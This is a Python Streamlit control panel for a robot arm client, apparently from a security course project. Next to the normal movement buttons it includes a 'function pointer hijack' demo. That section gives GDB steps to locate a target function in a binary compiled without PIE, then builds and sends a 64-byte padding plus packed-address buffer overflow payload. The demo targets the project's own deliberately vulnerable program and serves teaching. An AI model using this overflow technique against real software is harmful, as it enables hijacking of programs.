import streamlit as st
import subprocess
import os
import time
import threading
from streamlit.runtime.scriptrunner import add_script_run_ctx
import sys # Import sys
import struct # Import struct for packing the address

# --- Configuration ---
# !!! Ensure this path is correct for your system !!!
CLIENT_EXECUTABLE = "/home/rapid/ssl_project_c/src/client_robot"
DEFAULT_SERVER_IP = "192.168.1.100" # Default IP

# --- Session State Initialization ---
def initialize_session_state():
    if 'executing' not in st.session_state:
        st.session_state.executing = False
    if 'status_message' not in st.session_state:
        st.session_state.status_message = ""
    if 'command_history' not in st.session_state:
        st.session_state.command_history = []

# --- Client Execution Function (Reads stdin for attack) ---
def execute_client_command(command_identifier, server_ip, payload_bytes=None):
    """
    Executes the client robot command.

    Args:
        command_identifier (str): The command type ('spin ninety', 'attack', etc.).
                                  Passed via COMMAND env var.
        server_ip (str): The server IP address.
        payload_bytes (bytes, optional): The raw payload for stdin (only for 'attack').
    """
    if st.session_state.executing:
        st.warning("A command is already being executed. Please wait.")
        return

    st.session_state.executing = True
    display_command = command_identifier
    if payload_bytes:
        display_command = f"{command_identifier} <payload_via_stdin>"
    st.session_state.status_message = f"Executing: {display_command}"
    st.rerun() # Update UI

    start_time = time.time()
    combined_output = ""
    exit_code = -1
    status = "Error" # Default status

    try:
        env = os.environ.copy()
        # Always set the COMMAND env var to identify the command type
        env["COMMAND"] = command_identifier

        process_args = [CLIENT_EXECUTABLE, server_ip]
        stdin_pipe = None
        use_text_mode = True # Default to text mode
        input_data = None

        # === Use stdin ONLY for the 'attack' command ===
        if command_identifier == "attack" and payload_bytes is not None:
            st.write("Debug: Using stdin pipe and binary mode for attack payload.") # Debug
            stdin_pipe = subprocess.PIPE # Use stdin pipe
            use_text_mode = False      # Use binary mode for stdin/stdout/stderr
            input_data = payload_bytes # Set raw bytes as input
        # === === === === === === === === === === === ===

        process = subprocess.Popen(
            process_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=stdin_pipe,      # Set stdin pipe only if needed
            text=use_text_mode,    # Set text mode based on command
            env=env
        )

        # Communicate: send input_data if provided (for attack), otherwise None
        stdout_data, stderr_data = process.communicate(input=input_data)
        exit_code = process.returncode

        # Decode stdout/stderr if we used binary mode
        if not use_text_mode:
             stdout = stdout_data.decode(sys.stdout.encoding or 'utf-8', errors='replace') if stdout_data else ""
             stderr = stderr_data.decode(sys.stderr.encoding or 'utf-8', errors='replace') if stderr_data else ""
        else:
             stdout = stdout_data
             stderr = stderr_data

        combined_output = f"--- STDOUT ---\n{stdout.strip()}\n--- STDERR ---\n{stderr.strip()}"

        # Determine status based on exit code
        if exit_code == 0:
            status = "Success"
            st.session_state.status_message = f"Completed: {display_command}"
        else:
            # Special case: An attack might cause a crash (non-zero exit code)
            # but still be considered "successful" in terms of hijacking.
            # Check stderr for the success message from client_robot.c
            if command_identifier == "attack" and "Control Hijacked!" in stdout + stderr:
                status = "Success (Hijacked!)"
                st.session_state.status_message = f"Attack Succeeded: {display_command} (Client may have terminated unexpectedly)"
            else:
                 status = "Failed"
                 st.session_state.status_message = f"Failed: {display_command} (Exit Code: {exit_code})"

    except FileNotFoundError:
         st.error(f"Error: Client executable not found at '{CLIENT_EXECUTABLE}'.")
         status = "Error"
         combined_output = f"Client executable not found at '{CLIENT_EXECUTABLE}'."
    except Exception as e:
        st.error(f"Error executing command: {str(e)}")
        status = "Error"
        combined_output = str(e)
        exit_code = -1 # Indicate script error

    finally:
        duration = time.time() - start_time
        st.session_state.command_history.append({
            "command": display_command, "status": status,
            "time": time.strftime("%H:%M:%S"), "output": combined_output,
            "duration": duration, "exit_code": exit_code
        })
        st.session_state.executing = False
        st.rerun() # Update UI

# --- Thread Starter ---
def start_command_thread(cmd_identifier, ip_addr, payload=None):
     thread = threading.Thread(
         target=execute_client_command,
         args=(cmd_identifier, ip_addr, payload)
     )
     add_script_run_ctx(thread)
     thread.start()

# --- Main UI ---
def main():
    st.set_page_config(page_title="Robot Control", layout="wide")
    if not os.path.exists(CLIENT_EXECUTABLE):
        st.error(f"Client executable not found: {CLIENT_EXECUTABLE}")
        st.stop()

    initialize_session_state()

    st.title("🔒 Secure Robot Arm Controller")
    st.write("Control interface with hash chain verification and attack demonstration.")

    server_ip = st.text_input("Server IP Address", DEFAULT_SERVER_IP)

    st.markdown("---")
    st.subheader("Standard Commands")
    cols = st.columns(3)
    with cols[0]:
        if st.button("Spin 90°", key="spin90", disabled=st.session_state.executing, use_container_width=True):
            start_command_thread("spin ninety", server_ip)
    with cols[1]:
        if st.button("Spin 180°", key="spin180", disabled=st.session_state.executing, use_container_width=True):
             start_command_thread("spin oneeighty", server_ip)
    with cols[2]:
        if st.button("Rest Position", key="rest", disabled=st.session_state.executing, use_container_width=True):
            start_command_thread("rest", server_ip)

    # Buffer overflow attack section
    st.markdown("---")
    st.subheader("⚠️ Security Test: Function Pointer Hijack")

    # === Payload Construction ===
    st.markdown("""
    **Finding the Target Address:**
    1. Compile `client_robot.c` with ASLR *disabled* (e.g., `gcc ... -no-pie -fno-pie`).
    2. Run `gdb ./client_robot` (use correct path).
    3. In GDB, type `info functions attack_success_indicator` and press Enter.
    4. Note the address shown (e.g., `0x401234`).
    5. Enter that address below.
    """)

    # Input for the target address (as hex string)
    target_addr_hex = st.text_input("Target Function Address (from GDB, e.g., 0x401234)", "0x401234")

    attack_payload_bytes = None
    attack_button_enabled = False
    payload_error = ""

    try:
        # Convert hex string input to integer
        target_function_address = int(target_addr_hex, 16)

        # Construct the payload:
        # - 64 bytes of padding ('A') to fill cmd.buf
        # - 8 bytes representing the target function address (packed as little-endian unsigned long long)
        # '<Q' means little-endian (typical for x86_64) unsigned 64-bit integer
        packed_address = struct.pack('<Q', target_function_address)
        attack_payload_bytes = b'A' * 64 + packed_address

        st.text("Payload to be sent via stdin (raw bytes):")
        st.code(f"{repr(attack_payload_bytes[:64])} + {repr(packed_address)}", language=None)
        st.caption(f"Total payload length: {len(attack_payload_bytes)} bytes")
        attack_button_enabled = not st.session_state.executing

    except ValueError:
        payload_error = "Invalid hex address format. Use '0x...' prefix."
        st.error(payload_error)
        attack_button_enabled = False
    except struct.error as e:
        payload_error = f"Error packing address {target_addr_hex}: {e}. Is it a valid 64-bit address?"
        st.error(payload_error)
        attack_button_enabled = False

    # === === === === === === ===

    if st.button("💥 Launch Function Pointer Hijack Attack",
                 key="attack",
                 disabled=not attack_button_enabled):
        if attack_payload_bytes:
            st.info("Sending payload via stdin to overwrite buffer and function pointer...")
            # Pass "attack" identifier and the constructed payload bytes
            start_command_thread("attack", server_ip, attack_payload_bytes)
        else:
             st.error(f"Cannot launch attack: {payload_error or 'Payload construction failed.'}")

    # --- Status and History Display ---
    st.markdown("---")
    if st.session_state.status_message:
        if "Failed" in st.session_state.status_message:
             st.error(st.session_state.status_message)
        elif "Success (Hijacked!)" in st.session_state.status_message:
             st.warning(st.session_state.status_message) # Use warning for successful attack
        elif "Completed" in st.session_state.status_message or "Success" in st.session_state.status_message:
             st.success(st.session_state.status_message)
        else:
             st.info(st.session_state.status_message) # For Executing, etc.

    if st.session_state.executing:
        st.warning("⏳ Command in progress...")

    st.markdown("---")
    st.header("Command History")
    if st.button("Clear History"):
        st.session_state.command_history = []
        st.session_state.status_message = ""
        st.rerun()

    for item in reversed(st.session_state.command_history):
        status_color = "green"
        if item['status'] == "Failed": status_color = "red"
        elif item['status'] == "Error": status_color = "orange"
        elif "Hijacked!" in item['status']: status_color = "magenta" # Highlight successful attack

        with st.expander(f"[{item['time']}] {item['command']} -> <span style='color:{status_color}; font-weight:bold;'>{item['status']}</span> ({(item.get('duration', 0)):.2f}s | Exit: {item.get('exit_code', 'N/A')})", expanded=False):
            st.text("Output Log (stdout & stderr):")
            st.code(item.get('output', 'No output captured'), language='text')

if __name__ == "__main__":
    main()
